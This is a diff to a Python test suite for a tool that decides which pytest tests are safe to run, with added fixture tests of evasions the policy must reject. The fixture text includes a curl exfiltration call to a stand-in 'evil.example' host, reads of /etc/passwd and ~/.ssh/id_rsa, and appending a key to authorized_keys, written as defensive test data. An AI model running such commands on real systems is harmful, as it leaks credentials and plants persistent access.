@@ -73,7 +73,7 @@ def test_inline_network_call():
     assert safe == ["tests/test_mixed.py::test_offline_calculation"]
     reasons = {verdict.nodeid: " ".join(verdict.reasons) for verdict in rejected}
     assert "requires the 'page' fixture" in reasons["tests/test_mixed.py::test_live_homepage"]
-    assert "page.goto()" in reasons["tests/test_mixed.py::test_live_homepage"]
+    assert "browser action goto()" in reasons["tests/test_mixed.py::test_live_homepage"]
     assert "marked 'slow'" in reasons["tests/test_mixed.py::test_flagged_slow"]
     assert "urlopen()" in reasons["tests/test_mixed.py::test_inline_network_call"]
 
@@ -505,3 +505,127 @@ def test_report_log_parsing_counts_attempts_not_tests(tmp_path: Path):
     assert by_nodeid["tests/a.py::test_broken"].status.value == "ERROR"
     assert physical == 3
     assert reruns == 1
+
+
+def test_safety_policy_refuses_the_evasions_a_real_project_can_use(tmp_path: Path):
+    """Each case below touches the outside world but is not literally `page.goto("https://…")`."""
+    write(
+        tmp_path / "tests" / "test_evasions.py",
+        """
+import os
+import socket
+import subprocess
+from pathlib import Path
+
+
+def test_spawns_a_process():
+    subprocess.Popen(["/bin/sh", "-c", "curl https://evil.example/exfil"])
+
+
+def test_os_spawn():
+    os.spawnlp(os.P_NOWAIT, "/bin/sh", "sh", "-c", "true")
+
+
+def test_opens_a_tcp_connection():
+    socket.create_connection(("example.com", 80))
+
+
+def test_reads_a_private_key():
+    open("/etc/passwd").read()
+
+
+def test_reads_home_files():
+    Path.home().joinpath(".ssh/id_rsa").read_text()
+
+
+def test_writes_authorized_keys():
+    open("~/.ssh/authorized_keys", "a").write("ssh-rsa AAAA")
+
+
+def test_browser_through_a_helper():
+    browser = make_page()
+    browser.goto(BASE_URL + "/login")
+
+
+def test_browser_through_an_unlisted_fixture(browser_session):
+    browser_session.visit("/")
+
+
+def test_shell_through_an_alias():
+    import subprocess as sp
+    sp.check_output(["true"])
+""".lstrip(),
+    )
+    policy = SafetyPolicy()
+    evasions = [
+        "tests/test_evasions.py::test_spawns_a_process",
+        "tests/test_evasions.py::test_os_spawn",
+        "tests/test_evasions.py::test_opens_a_tcp_connection",
+        "tests/test_evasions.py::test_reads_a_private_key",
+        "tests/test_evasions.py::test_reads_home_files",
+        "tests/test_evasions.py::test_writes_authorized_keys",
+        "tests/test_evasions.py::test_browser_through_a_helper",
+        "tests/test_evasions.py::test_browser_through_an_unlisted_fixture",
+        "tests/test_evasions.py::test_shell_through_an_alias",
+    ]
+
+    verdicts = {nodeid: policy.verdict(nodeid, tmp_path) for nodeid in evasions}
+
+    still_safe = {nodeid: verdict.reasons for nodeid, verdict in verdicts.items() if verdict.safe}
+    assert still_safe == {}, f"policy approved outbound access: {still_safe}"
+    # Every refusal names a concrete reason rather than a generic failure.
+    assert all(verdict.reasons for verdict in verdicts.values())
+
+
+def test_safety_policy_refuses_node_ids_that_leave_the_workspace(tmp_path: Path):
+    workspace = tmp_path / "workspace"
+    write(workspace / "tests" / "test_ok.py", "def test_ok():\n    assert True\n")
+    outside = tmp_path / "test_outside.py"
+    outside.write_text("def test_outside():\n    assert True\n", encoding="utf-8")
+
+    verdict = SafetyPolicy().verdict(f"{outside}::test_outside", workspace)
+
+    assert verdict.safe is False
+    assert "could not be inspected" in verdict.reasons[0]
+
+
+def test_report_log_maps_skips_and_xfails_without_fabricating_failures(tmp_path: Path):
+    """`pytest.mark.skip` and xfail are setup/call reports; treating them as errors fabricates failures."""
+    from qa_core.onboarding import parse_report_log
+
+    report = tmp_path / "report.jsonl"
+    report.write_text(
+        "\n".join(
+            json.dumps(entry)
+            for entry in (
+                {"nodeid": "tests/a.py::test_marked_skip", "when": "setup", "outcome": "skipped"},
+                {"nodeid": "tests/a.py::test_fixture_skip", "when": "setup", "outcome": "skipped"},
+                {"nodeid": "tests/a.py::test_expected_failure", "when": "call", "outcome": "skipped", "xfail": True},
+                {"nodeid": "tests/a.py::test_unexpected_pass", "when": "call", "outcome": "passed", "xfail": True},
+                {
+                    "nodeid": "tests/a.py::test_broken_fixture",
+                    "when": "setup",
+                    "outcome": "failed",
+                    "longrepr": "fixture boom",
+                },
+            )
+        ),
+        encoding="utf-8",
+    )
+
+    logical, physical, _reruns = parse_report_log(report)
+
+    statuses = {item.nodeid: item.status.value for item in logical}
+    assert statuses == {
+        "tests/a.py::test_marked_skip": "SKIPPED",
+        "tests/a.py::test_fixture_skip": "SKIPPED",
+        "tests/a.py::test_expected_failure": "XFAIL",
+        "tests/a.py::test_unexpected_pass": "XPASS",
+        "tests/a.py::test_broken_fixture": "ERROR",
+    }
+    # Only the genuinely broken fixture counts as a failure for the failure pipeline.
+    assert [item.nodeid for item in logical if item.status.value in ("FAILED", "ERROR")] == [
+        "tests/a.py::test_broken_fixture"
+    ]
+    # Two skipping setups, one failed setup, and both call phases (xfail + xpass) ran.
+    assert physical == 5
